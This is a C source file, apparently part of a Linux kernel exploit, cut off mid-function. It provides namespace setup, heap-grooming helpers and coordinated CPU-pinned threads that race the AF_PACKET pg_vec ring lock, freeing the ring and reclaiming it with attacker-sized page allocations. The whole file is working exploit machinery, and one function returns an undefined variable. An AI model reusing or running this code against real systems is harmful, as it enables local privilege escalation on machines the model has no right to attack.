#include "exploit.h"

void unix_error(const char *msg)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
	exit(EXIT_FAILURE);
}

void Mnl_socket_error(const char *msg)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
	exit(EXIT_FAILURE);
}

void Pthread_error(const char *msg, int error_code)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(error_code));
	exit(EXIT_FAILURE);
}

void Unshare(int flags)
{
	if (unshare(flags) < 0)
		unix_error("unshare");
}

int Socket(int domain, int type, int protocol)
{
	int fd = socket(domain, type, protocol);
	if (fd < 0)
		unix_error("socket");
	return fd;
}

void Setsockopt(int fd, int level, int optname, const void *optval, socklen_t optlen)
{
	if (setsockopt(fd, level, optname, optval, optlen) < 0)
		unix_error("setsockopt");
}

void Getsockopt(int fd, int level, int optname, void *optval, socklen_t *optlen)
{
	if (getsockopt(fd, level, optname, optval, optlen) < 0)
		unix_error("getsockopt");
}

void Bind(int fd, const struct sockaddr *addr, socklen_t addrlen)
{
	if (bind(fd, addr, addrlen) < 0)
		unix_error("bind");
}

void Ioctl(int fd, unsigned long request, unsigned long arg)
{
	if (ioctl(fd, request, arg) < 0)
		unix_error("ioctl");
}

void Close(int fd)
{
	if (close(fd) < 0)
		unix_error("close");
}

int Dup(int fd)
{
	int newfd = dup(fd);
	if (newfd < 0)
		unix_error("dup");
	return newfd;
}

void Pipe2(int pipefd[2], int flags)
{
	if (pipe2(pipefd, flags) < 0)
		unix_error("pipe2");
}

int Fcntl(int fd, int op, unsigned long arg)
{
	int ret = fcntl(fd, op, arg);
	if (ret < 0)
		unix_error("fcntl");
	return ret;
}

void *Mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
	void *m = mmap(addr, len, prot, flags, fd, offset);
	if (m == MAP_FAILED)
		unix_error("mmap");
	return m;
}

void Munmap(void *addr, size_t len)
{
	if (munmap(addr, len) < 0)
		unix_error("munmap");
}

FILE *Fopen(const char *filename, const char *modes)
{
	FILE *f = fopen(filename, modes);
	if (f == NULL)
		unix_error("fopen");
	return f;
}

void Fclose(FILE *stream)
{
	if (fclose(stream) != 0)
		unix_error("fclose");
}

void *Calloc(size_t nmemb, size_t size)
{
	void *p = calloc(nmemb, size);
	if (p == NULL)
		unix_error("calloc");
	return p;
}

ssize_t Sendmsg(int socket, const struct msghdr *message, int flags)
{
	ssize_t ret = sendmsg(socket, message, flags);
	if (ret < 0)
		unix_error("sendmsg");
	return ret;
}

void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)
{
	int ret = pthread_create(newthread, attr, start_routine, arg);
	if (ret != 0)
		Pthread_error("pthread_create", ret);
}

void Pthread_join(pthread_t thread, void **retval)
{
	int ret = pthread_join(thread, retval);
	if (ret != 0)
		Pthread_error("pthread_join", ret);
}

void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset)
{
	int ret = pthread_setaffinity_np(thread, cpusetsize, cpuset);
	if (ret != 0)
		Pthread_error("pthread_setaffinity_np", ret);
}

void Getrlimit(int resource, struct rlimit *rlim)
{
	if (getrlimit(resource, rlim) < 0)
		unix_error("getrlimit");
}

void Setrlimit(int resource, const struct rlimit *rlim)
{
	if (setrlimit(resource, rlim) < 0)
		unix_error("setrlimit");
}

void Setpriority(int which, id_t who, int value)
{
	if (setpriority(which, who, value) < 0)
		unix_error("setpriority");
}

int Timerfd_create(int clockid, int flags)
{
	int timerfd = timerfd_create(clockid, flags);
	if (timerfd < 0)
		unix_error("timerfd_create");
	return timerfd;
}

void Timerfd_settime(int fd, int flags, const struct itimerspec *new_value, struct itimerspec *old_value)
{
	if (timerfd_settime(fd, flags, new_value, old_value) < 0)
		unix_error("timerfd_settime");
}

int Epoll_create1(int flags)
{
	int epfd = epoll_create1(flags);
	if (epfd < 0)
		unix_error("epoll_create1");
	return epfd;
}

void Epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)
{
	if (epoll_ctl(epfd, op, fd, event) < 0)
		unix_error("epoll_ctl");
}

unsigned int If_nametoindex(const char *ifname)
{
	unsigned int ifindex = if_nametoindex(ifname);
	if (ifindex == 0)
		unix_error("if_nametoindex");
	return ifindex;
}

void Mkdir(const char *pathname, mode_t mode)
{
	if (mkdir(pathname, mode) < 0)
		unix_error("mkdir");
}

void Mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data)
{
	if (mount(source, target, filesystemtype, mountflags, data) < 0)
		unix_error("mount");
}

int Open(const char *pathname, int flags, mode_t mode)
{
	int fd = open(pathname, flags, mode);
	if (fd < 0)
		unix_error("open");
	return fd;
}

void Setxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
	if (setxattr(path, name, value, size, flags) < 0)
		unix_error("setxattr");
}

ssize_t Getxattr(const char *path, const char *name, void *value, size_t size)
{
	ssize_t ret = getxattr(path, name, value, size);
	if (ret < 0)
		unix_error("getxattr");
	return ret;
}

void Removexattr(const char *path, const char *name)
{
	if (removexattr(path, name) < 0)
		unix_error("removexattr");
}

char *Strdup(const char *s)
{
	char *s1 = strdup(s);
	if (s1 == NULL)
		unix_error("strdup");
	return s1;
}

ssize_t Read(int fd, void *buf, size_t count)
{
	ssize_t ret = read(fd, buf, count);
	if (ret < 0)
		unix_error("read");
	return ret;
}

ssize_t Write(int fd, const void *buf, size_t count)
{
	ssize_t ret = write(fd, buf, count);
	if (ret < 0)
		unix_error("write");
	return ret;
}

struct mnl_socket *Mnl_socket_open(int bus)
{
	struct mnl_socket *nl = mnl_socket_open(bus);
	if (nl == NULL)
		Mnl_socket_error("mnl_socket_open");
	return nl;
}

void Mnl_socket_close(struct mnl_socket *nl)
{
	if (mnl_socket_close(nl) < 0)
		Mnl_socket_error("mnl_socket_close");
}

void Mnl_socket_bind(struct mnl_socket *nl, unsigned int groups, pid_t pid)
{
	if (mnl_socket_bind(nl, groups, pid) < 0)
		Mnl_socket_error("mnl_socket_bind");
}

ssize_t Mnl_socket_sendto(const struct mnl_socket *nl, const void *req, size_t size)
{
	ssize_t rc = mnl_socket_sendto(nl, req, size);
	if (rc < 0)
		Mnl_socket_error("mnl_socket_sendto");
	return rc;
}

ssize_t Mnl_socket_recvfrom(const struct mnl_socket *nl, void *buf, size_t size)
{
	ssize_t rc = mnl_socket_recvfrom(nl, buf, size);
	if (rc < 0)
		Mnl_socket_error("mnl_socket_recvfrom");
	return rc;
}

void validate_mnl_socket_operation_success(struct mnl_socket *nl, u32 seq)
{
	u8 buf[8192] = {};
	u32 portid = mnl_socket_get_portid(nl);
	ssize_t ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));

	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}

	if (ret < 0)
		exit(EXIT_FAILURE);
}

void dummy_network_interface_create(const char *ifname, u32 mtu)
{
	struct mnl_socket *nl = Mnl_socket_open(NETLINK_ROUTE);
	Mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID);
	u32 seq = time(NULL);
	u8 buf[8192] = {};

	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_flags = NLM_F_ACK | NLM_F_REQUEST | NLM_F_CREATE;

	struct ifinfomsg *ifm = mnl_nlmsg_put_extra_header(nlh, sizeof(*ifm));
	mnl_attr_put_strz(nlh, IFLA_IFNAME, ifname);
	mnl_attr_put_u32(nlh, IFLA_MTU, mtu);

	struct nlattr *linkinfo = mnl_attr_nest_start(nlh, IFLA_LINKINFO);
	mnl_attr_put_strz(nlh, IFLA_INFO_KIND, "dummy");
	mnl_attr_nest_end(nlh, linkinfo);

	Mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);
	validate_mnl_socket_operation_success(nl, seq);
	Mnl_socket_close(nl);
}

void network_interface_up(int configure_socket_fd, const char *ifname)
{
	struct ifreq ifr = {};
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	Ioctl(configure_socket_fd, SIOCGIFFLAGS, (unsigned long)&ifr);

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ifr.ifr_flags |= (IFF_UP | IFF_RUNNING);
	Ioctl(configure_socket_fd, SIOCSIFFLAGS, (unsigned long)&ifr);
}

void network_interface_down(int configure_socket_fd, const char *ifname)
{
	struct ifreq ifr = {};
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	Ioctl(configure_socket_fd, SIOCGIFFLAGS, (unsigned long)&ifr);

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ifr.ifr_flags &= (~IFF_UP);
	Ioctl(configure_socket_fd, SIOCSIFFLAGS, (unsigned long)&ifr);
}

void pin_thread_on_cpu(int cpu)
{
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	pthread_t current_thread = pthread_self();
	Pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void setup_namespace(void)
{
	int uid = getuid();
	int gid = getgid();

	Unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS);

	FILE *f = NULL;
	f = Fopen("/proc/self/uid_map", "w");
	fprintf(f, "0 %d 1\n", uid);
	Fclose(f);

	f = Fopen("/proc/self/setgroups", "w");
	fprintf(f, "deny\n");
	Fclose(f);

	f = Fopen("/proc/self/gid_map", "w");
	fprintf(f, "0 %d 1\n", gid);
	Fclose(f);
}

void setup_tmpfs(void)
{
	Mkdir(TMPFS_MOUNT_POINT, 0644);
	Mount("none", TMPFS_MOUNT_POINT, "tmpfs", 0, NULL);
	create_file(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH);
}

void setup_nofile_rlimit(void)
{
	struct rlimit nofile_rlimit = {};
	Getrlimit(RLIMIT_NOFILE, &nofile_rlimit);
	nofile_rlimit.rlim_cur = nofile_rlimit.rlim_max;
	Setrlimit(RLIMIT_NOFILE, &nofile_rlimit);
}

void create_file(const char *path)
{
	int fd = Open(path, O_WRONLY | O_CREAT, 0644);
	Close(fd);
}

bool thread_in_sleep_state(int tid)
{
	if (tid == -1)
		return false;

	char proc_path[4096] = {};
	char line_buffer[4096] = {};

	snprintf(proc_path, sizeof(proc_path), "/proc/%d/stat", tid);
	FILE *f = Fopen(proc_path, "r");

	if (!fgets(line_buffer, sizeof(line_buffer), f)) {
		Fclose(f);
		return false;
	}

	char *p = line_buffer;
	int space_count = 0;
	while (*p != '\0' && space_count != 2) {
		if (*p == ' ') {
			space_count++;
		}

		p++;
	}

	Fclose(f);

	if (*p == 'S' || *p == 'D') {
		return true;
	}
	
	return false;
}

void alloc_pages(int packet_socket, unsigned page_count, unsigned page_size)
{
	struct tpacket_req tx_ring_req = {};
	tx_ring_req.tp_block_nr = page_count;
	tx_ring_req.tp_block_size = page_size;
	tx_ring_req.tp_frame_size = page_size;
	tx_ring_req.tp_frame_nr = tx_ring_req.tp_block_size / tx_ring_req.tp_frame_size * tx_ring_req.tp_block_nr;
	Setsockopt(packet_socket, SOL_PACKET, PACKET_TX_RING, &tx_ring_req, sizeof(tx_ring_req));
}

void free_pages(int packet_socket)
{
	struct tpacket_req tx_ring_req = {};
	Setsockopt(packet_socket, SOL_PACKET, PACKET_TX_RING, &tx_ring_req, sizeof(tx_ring_req));
}

struct victim_packet_socket_config *victim_packet_socket_config_create(
        struct __kernel_sock_timeval sndtimeo,
        struct sockaddr_ll addr,
        struct tpacket_req3 tx_ring,
        struct tpacket_req3 rx_ring,
        int packet_loss,
        int packet_version,
        unsigned packet_reserve,
        struct sock_filter filter[MAX_FILTER_LEN]
)
{
	struct victim_packet_socket_config *config = Calloc(1, sizeof(*config));
	config->sndtimeo = sndtimeo;
	config->addr = addr;
	config->tx_ring = tx_ring;
	config->rx_ring = rx_ring;
	config->packet_loss = packet_loss;
	config->packet_version = packet_version;
	config->packet_reserve = packet_reserve;
	memcpy(config->filter, filter, MAX_FILTER_LEN * sizeof(struct sock_filter));
	return config;
}

void victim_packet_socket_config_destroy(struct victim_packet_socket_config *config)
{
	free(config);
}

struct victim_packet_socket *victim_packet_socket_create(struct victim_packet_socket_config *config)
{
	struct victim_packet_socket *v = Calloc(1, sizeof(*v));
	v->config = Calloc(1, sizeof(*v->config));
	memcpy(v->config, config, sizeof(struct victim_packet_socket_config));
	v->fd = Socket(AF_PACKET, SOCK_RAW, 0);
	return v;
}

void victim_packet_socket_destroy(struct victim_packet_socket *v)
{
	victim_packet_socket_config_destroy(v->config);
	Close(v->fd);
	free(v);
}

void victim_packet_socket_configure(struct victim_packet_socket *v)
{
	struct victim_packet_socket_config *config = v->config;
	Bind(v->fd, (const struct sockaddr *)&config->addr, sizeof(config->addr));
	Setsockopt(v->fd, SOL_SOCKET, SO_SNDTIMEO_NEW, &config->sndtimeo, sizeof(config->sndtimeo));
	Setsockopt(v->fd, SOL_PACKET, PACKET_LOSS, &config->packet_loss, sizeof(config->packet_loss));
	Setsockopt(v->fd, SOL_PACKET, PACKET_VERSION, &config->packet_version, sizeof(config->packet_version));
	Setsockopt(v->fd, SOL_PACKET, PACKET_RESERVE, &config->packet_reserve, sizeof(config->packet_reserve));
	Setsockopt(v->fd, SOL_PACKET, PACKET_RX_RING, &config->rx_ring, sizeof(config->rx_ring));
	Setsockopt(v->fd, SOL_PACKET, PACKET_TX_RING, &config->tx_ring, sizeof(config->tx_ring));
	struct sock_fprog fprog = { .filter = config->filter, .len = MAX_FILTER_LEN };
	Setsockopt(v->fd, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog));

	u64 tx_ring_size = (u64)config->tx_ring.tp_block_size * config->tx_ring.tp_block_nr;
	u64 rx_ring_size = (u64)config->rx_ring.tp_block_size * config->rx_ring.tp_block_nr;
	u64 ring_size = tx_ring_size + rx_ring_size;
	void *ring = Mmap(NULL, ring_size, PROT_READ | PROT_WRITE, MAP_SHARED, v->fd, 0);
	void *tx_ring = ring + rx_ring_size;
	struct tpacket3_hdr *h = tx_ring;
	h->tp_len = 1;
	h->tp_status = TP_STATUS_SEND_REQUEST;
	Munmap(ring, ring_size);
}

struct simple_xattr_request *simple_xattr_request_create(
        const char *filepath,
        const char *name,
        const char *value,
        size_t value_size
)
{
	struct simple_xattr_request *request = Calloc(1, sizeof(*request));
	strncpy(request->filepath, filepath, PATH_MAX);
	strncpy(request->name, name, XATTR_NAME_MAX);
	request->value = Calloc(1, value_size);
	memcpy(request->value, value, value_size);
	request->value_size = value_size;
	request->allocated = false;
	return request;
}

void simple_xattr_request_destroy(struct simple_xattr_request *request)
{
	free(request->value);
	free(request);
}

void *timerfd_waitlist_thread_fn(void *arg)
{
	pin_thread_on_cpu(CPU_NUMBER_ONE);
	struct timerfd_waitlist_thread *t = arg;
	t->tid = gettid();

	Unshare(CLONE_FILES);
	pthread_mutex_lock(&t->mutex);
	t->unshare_complete = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
	
	Close(STDIN_FILENO);
	Close(STDOUT_FILENO);

	int epollfd = Epoll_create1(0);

	struct rlimit nofile_rlimit = {};
	Getrlimit(RLIMIT_NOFILE, &nofile_rlimit);
	t->timerfds = Calloc(nofile_rlimit.rlim_cur, sizeof(*t->timerfds));
	t->timerfds[0] = t->timerfd;
	t->total_timerfd = 1;

	for (int i = 1; i < (int)nofile_rlimit.rlim_cur; i++) {
		t->timerfds[i] = dup(t->timerfds[0]);
		if (t->timerfds[i] < 0)
			break;

		t->total_timerfd++;
	}

	t->epoll_events = Calloc(t->total_timerfd, sizeof(*t->epoll_events));
	for (int i = 0; i < t->total_timerfd; i++) {
		t->epoll_events[i].data.fd = t->timerfds[i];
		t->epoll_events[i].events = EPOLLIN;
		Epoll_ctl(epollfd, EPOLL_CTL_ADD, t->timerfds[i], &t->epoll_events[i]);
	}

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->ready_to_work)
			pthread_cond_wait(&t->cond, &t->mutex);

		t->ready_to_work = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);
		
		if (quit)
			break;
		
		pthread_mutex_lock(&t->mutex);
		t->work_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	for (int i = 1; i < t->total_timerfd; i++)
		Close(t->timerfds[i]);

	Close(epollfd);
	free(t->epoll_events);
	free(t->timerfds);

	return NULL;
}

void timerfd_waitlist_thread_wait_unshare_complete(struct timerfd_waitlist_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->unshare_complete)
		pthread_cond_wait(&t->cond, &t->mutex);
	pthread_mutex_unlock(&t->mutex);
}

void timerfd_waitlist_thread_send_work(struct timerfd_waitlist_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->ready_to_work = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void timerfd_waitlist_thread_wait_in_work(struct timerfd_waitlist_thread *t)
{
	while (t->tid == -1) {
		;
	}

	while (!thread_in_sleep_state(t->tid)) {
		;
	}
}

void timerfd_waitlist_thread_wait_work_complete(struct timerfd_waitlist_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->work_complete)
		pthread_cond_wait(&t->cond, &t->mutex);
	t->work_complete = false;
	pthread_mutex_unlock(&t->mutex);
}

void timerfd_waitlist_thread_quit(struct timerfd_waitlist_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
	Pthread_join(t->handle, NULL);
}

struct timerfd_waitlist_thread *timerfd_waitlist_thread_create(int timerfd)
{
	struct timerfd_waitlist_thread *t = Calloc(1, sizeof(*t));
	t->tid = -1;
	t->timerfd = timerfd;
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	Pthread_create(&t->handle, NULL, timerfd_waitlist_thread_fn, t);
	return t;
}

void timerfd_waitlist_thread_destroy(struct timerfd_waitlist_thread *t)
{
	timerfd_waitlist_thread_quit(t);
	pthread_cond_destroy(&t->cond);
	pthread_mutex_destroy(&t->mutex);
	free(t);
}

struct pg_vec_lock_thread_work *pg_vec_lock_thread_work_create(struct victim_packet_socket *v, int ifindex)
{
	struct pg_vec_lock_thread_work *w = Calloc(1, sizeof(*w));
	w->victim_packet_socket = v;
	w->ifindex = ifindex;
	return w;
}

void pg_vec_lock_thread_work_destroy(struct pg_vec_lock_thread_work *w)
{
	free(w);
}

void *pg_vec_lock_thread_fn(void *arg)
{
	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	struct pg_vec_lock_thread *t = arg;
	t->tid = gettid();

	Setpriority(PRIO_PROCESS, 0, MAX_NICE);

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->ready_to_work)
			pthread_cond_wait(&t->cond, &t->mutex);
		
		struct pg_vec_lock_thread_work *work = t->work;
		t->work = NULL;
		t->ready_to_work = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);

		if (quit)
			break;

		struct sockaddr_ll addr = { .sll_ifindex = work->ifindex };
		struct msghdr msg = { .msg_name = &addr, .msg_namelen = sizeof(addr) };
		syscall(SYS_sendmsg, work->victim_packet_socket->fd, &msg, 0);
		
		pg_vec_lock_thread_work_destroy(work);
		pthread_mutex_lock(&t->mutex);
		t->work_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	return NULL;
}

void pg_vec_lock_thread_send_work(struct pg_vec_lock_thread *t, struct pg_vec_lock_thread_work *w)
{
	pthread_mutex_lock(&t->mutex);
	t->work = w;
	t->ready_to_work = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

struct timespec pg_vec_lock_thread_wait_in_work(struct pg_vec_lock_thread *t)
{
	while (!thread_in_sleep_state(t->tid)) {
		;
	}

	struct timespec pg_vec_lock_acquire_time = {};
	syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &pg_vec_lock_acquire_time);
	return pg_vec_lock_acquire_time;
}

void pg_vec_lock_thread_wait_work_complete(struct pg_vec_lock_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->work_complete)
		pthread_cond_wait(&t->cond, &t->mutex);
	t->work_complete = false;
	pthread_mutex_unlock(&t->mutex);
}

void pg_vec_lock_thread_quit(struct pg_vec_lock_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
	Pthread_join(t->handle, NULL);
}

struct pg_vec_lock_thread *pg_vec_lock_thread_create(void)
{
	struct pg_vec_lock_thread *t = Calloc(1, sizeof(*t));
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	t->tid = -1;
	t->packet_socket = -1;
	t->ifindex = -1;
	Pthread_create(&t->handle, NULL, pg_vec_lock_thread_fn, t);
	return t;
}

void pg_vec_lock_thread_destroy(struct pg_vec_lock_thread *t)
{
	pg_vec_lock_thread_quit(t);
	free(t);
}

struct pg_vec_buffer_thread_work *pg_vec_buffer_thread_work_create(
	struct victim_packet_socket *v,
	bool exploit,
	bool cleanup
)
{
	struct pg_vec_buffer_thread_work *w = Calloc(1, sizeof(*w));
	w->victim_packet_socket = v;
	w->exploit = exploit;
	w->cleanup = cleanup;
	return w;
}

void pg_vec_buffer_thread_work_destroy(struct pg_vec_buffer_thread_work *w)
{
	free(w);
}

void *pg_vec_buffer_thread_fn(void *arg)
{
	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	struct pg_vec_buffer_thread *t = arg;
	t->tid = gettid();

	int reclaim_pg_vec_packet_socket = Socket(AF_PACKET, SOCK_RAW, 0);

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->ready_to_work)
			pthread_cond_wait(&t->cond, &t->mutex);
		
		struct pg_vec_buffer_thread_work *work = t->work;
		t->work = NULL;
		t->ready_to_work = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);

		if (quit)
			break;

		if (work->exploit) {
			struct tpacket_req3 free_pg_vec_req = {};
			syscall(
				SYS_setsockopt,
				work->victim_packet_socket->fd,
				SOL_PACKET,
				PACKET_RX_RING,
				&free_pg_vec_req,
				sizeof(free_pg_vec_req)
			);

			alloc_pages(reclaim_pg_vec_packet_socket, MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_KMALLOC_16, PAGES_ORDER2_SIZE);
		}

		if (work->cleanup) {
			free_pages(reclaim_pg_vec_packet_socket);
		}

		pg_vec_buffer_thread_work_destroy(work);

		pthread_mutex_lock(&t->mutex);
		t->work_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	Close(reclaim_pg_vec_packet_socket);
	return NULL;
}

void pg_vec_buffer_thread_send_work(struct pg_vec_buffer_thread *t, struct pg_vec_buffer_thread_work *w)
{
	pthread_mutex_lock(&t->mutex);
	t->work = w;
	t->ready_to_work = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void pg_vec_buffer_thread_wait_in_work(struct pg_vec_buffer_thread *t)
{
	while (t->tid == -1) {
		;
	}

	while (!thread_in_sleep_state(t->tid)) {
		;
	}
}

void pg_vec_buffer_thread_wait_work_complete(struct pg_vec_buffer_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->work_complete)
		pthread_cond_wait(&t->cond, &t->mutex);
	t->work_complete = false;
	pthread_mutex_unlock(&t->mutex);
}

void pg_vec_buffer_thread_quit(struct pg_vec_buffer_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
	Pthread_join(t->handle, NULL);
}

struct pg_vec_buffer_thread *pg_vec_buffer_thread_create(void)
{
	struct pg_vec_buffer_thread *t = Calloc(1, sizeof(*t));
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	t->tid = -1;
	Pthread_create(&t->handle, NULL, pg_vec_buffer_thread_fn, t);
	return t;
}

void pg_vec_buffer_thread_destroy(struct pg_vec_buffer_thread *t)
{
	pg_vec_buffer_thread_quit(t);
	pthread_cond_destroy(&t->cond);
	pthread_mutex_destroy(&t->mutex);
	free(t);
}

struct tpacket_rcv_thread_work *tpacket_rcv_thread_work_create(
        struct timespec pg_vec_lock_release_time,
	struct timespec decrease_tpacket_rcv_thread_sleep_time,
        struct msghdr *msg
)
{
	struct tpacket_rcv_thread_work *w = Calloc(1, sizeof(*w));
	w->pg_vec_lock_release_time = pg_vec_lock_release_time;
	w->decrease_tpacket_rcv_thread_sleep_time = decrease_tpacket_rcv_thread_sleep_time;
	w->msg = msg;
	return w;
}

void tpacket_rcv_thread_work_destroy(struct tpacket_rcv_thread_work *w)
{
	msghdr_destroy(w->msg);
	free(w);
}

void *tpacket_rcv_thread_fn(void *arg)
{
	pin_thread_on_cpu(CPU_NUMBER_ONE);
	struct tpacket_rcv_thread *t = arg;

	int trigger_sendmsg_packet_socket = Socket(AF_PACKET, SOCK_PACKET, 0);

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->ready_to_work)
			pthread_cond_wait(&t->cond, &t->mutex);
		
		struct tpacket_rcv_thread_work *work = t->work;
		t->work = NULL;
		t->ready_to_work = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);

		if (quit)
			break;
		
		struct timespec cur_time = {};
		syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &cur_time);
		struct timespec remaining_time_before_pg_vec_lock_release = timespec_sub(
			work->pg_vec_lock_release_time,
			cur_time
		);

		struct timespec sleep_duration = timespec_sub(
			remaining_time_before_pg_vec_lock_release,
			work->decrease_tpacket_rcv_thread_sleep_time
		);

		syscall(SYS_nanosleep, &sleep_duration, NULL);
		syscall(SYS_sendmsg, trigger_sendmsg_packet_socket, work->msg, 0);

		tpacket_rcv_thread_work_destroy(work);

		pthread_mutex_lock(&t->mutex);
		t->work_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	return NULL;
}

void tpacket_rcv_thread_send_work(struct tpacket_rcv_thread *t, struct tpacket_rcv_thread_work *w)
{
	pthread_mutex_lock(&t->mutex);
	t->work = w;
	t->ready_to_work = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void tpacket_rcv_thread_wait_work_complete(struct tpacket_rcv_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->work_complete)
		pthread_cond_wait(&t->cond, &t->mutex);

	t->work_complete = false;
	pthread_mutex_unlock(&t->mutex);

	return work_result;
}

void tpacket_rcv_thread_quit(struct tpacket_rcv_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
	Pthread_join(t->handle, NULL);
}

struct tpacket_rcv_thread *tpacket_rcv_thread_create(void)
{
	struct tpacket_rcv_thread *t = Calloc(1, sizeof(*t));
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	Pthread_create(&t->handle, NULL, tpacket_rcv_thread_fn, t);
	return t;
}

void tpacket_rcv_thread_destroy(struct tpacket_rcv_thread *t)
{
	tpacket_rcv_thread_quit(t);
	pthread_cond_destroy(&t->cond);
	pthread_mutex_destroy(&t->mutex);
	free(t);
}

struct msghdr *msghdr_create(
        void *data,
        size_t datalen,
	const char *devname
)
{
	void *copy_data = Calloc(1, datalen);
	if (data)
		memcpy(copy_data, data, datalen);
	
	struct iovec *iov = Calloc(1, sizeof(*iov));
	iov->iov_base = copy_data;
	iov->iov_len = datalen;

	struct sockaddr_pkt *addr = Calloc(1, sizeof(*addr));
	snprintf((char *)addr->spkt_device, sizeof(addr->spkt_device), "%s", devname);
	struct msghdr *msghdr = Calloc(1, sizeof(*msghdr));
	msghdr->msg_namelen = sizeof(struct sockaddr_pkt);
	msghdr->msg_name = addr;
	msghdr->msg_iov = iov;
	msghdr->msg_iovlen = 1;
	return msghdr;
}

void msghdr_destroy(struct msghdr *msghdr)
{
	struct iovec *iov = msghdr->msg_iov;
	size_t iov_len = msghdr->msg_iovlen;
	for (size_t i = 0; i < iov_len; i++)
		free(iov[i].iov_base);
	
	free(iov);
	struct sockaddr_pkt *addr = msghdr->msg_name;
	free(addr);
	free(msghdr);
}

struct necessary_threads *necessary_threads_create(int timerfd)
{
	struct necessary_threads *nt = Calloc(1, sizeof(*nt));

	nt->timerfd_waitlist_threads = Calloc(TOTAL_TIMERFD_WAITLIST_THREADS, sizeof(*nt->timerfd_waitlist_threads));
	for (int i = 0; i < TOTAL_TIMERFD_WAITLIST_THREADS; i++)
		nt->timerfd_waitlist_threads[i] = timerfd_waitlist_thread_create(timerfd);

	for (int i = 0; i < TOTAL_TIMERFD_WAITLIST_THREADS; i++)
		timerfd_waitlist_thread_wait_unshare_complete(nt->timerfd_waitlist_threads[i]);

	nt->pg_vec_lock_thread = pg_vec_lock_thread_create();
	nt->pg_vec_buffer_thread = pg_vec_buffer_thread_create();
	nt->tpacket_rcv_thread = tpacket_rcv_thread_create();

	return nt;
}

void necessary_threads_destroy(struct necessary_threads *nt)
{
	for (int i = 0; i < TOTAL_TIMERFD_WAITLIST_THREADS; i++)
		timerfd_waitlist_thread_destroy(nt->timerfd_waitlist_threads[i]);

	pg_vec_lock_thread_destroy(nt->pg_vec_lock_thread);
	pg_vec_buffer_thread_destroy(nt->pg_vec_buffer_thread);
